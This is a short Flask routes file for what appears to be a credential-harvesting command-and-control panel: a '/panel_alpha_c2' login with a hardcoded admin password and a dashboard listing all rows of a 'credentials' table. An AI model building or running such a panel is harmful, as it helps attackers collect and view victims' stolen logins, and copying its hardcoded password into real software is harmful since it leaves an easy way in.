from flask import Blueprint, render_template, request, redirect, url_for, session
import sqlite3
import os
from .auth import login_required

routes = Blueprint('routes', __name__)

@routes.route('/panel_alpha_c2/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == 'admin' and password == 'secret123':
            session['logged_in'] = True
            return redirect(url_for('routes.dashboard'))
    return render_template('login.html')

@routes.route('/panel_alpha_c2/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('routes.login'))

@routes.route('/panel_alpha_c2')
@login_required
def dashboard():
    BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../'))
    DB_PATH = os.path.join(BASE_DIR, 'creds.db')
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM credentials ORDER BY id DESC")
    rows = cursor.fetchall()
    conn.close()
    return render_template('dashboard.html', credentials=rows)
